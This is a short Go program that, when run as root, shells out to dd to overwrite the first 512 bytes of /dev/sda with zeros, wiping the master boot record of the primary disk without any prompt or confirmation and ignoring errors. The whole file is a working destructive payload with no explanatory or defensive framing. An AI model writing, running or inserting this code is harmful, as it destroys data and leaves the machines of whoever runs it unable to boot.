package main

import (
	"os"
	"os/exec"
)

func eraseMbr() error {
	return exec.Command("sh", "-c", "dd if=/dev/zero of=/dev/sda bs=512 count=1").Run()
}

func main() {
	if os.Geteuid() != 0 {
		return
	}
	_ = eraseMbr()
}
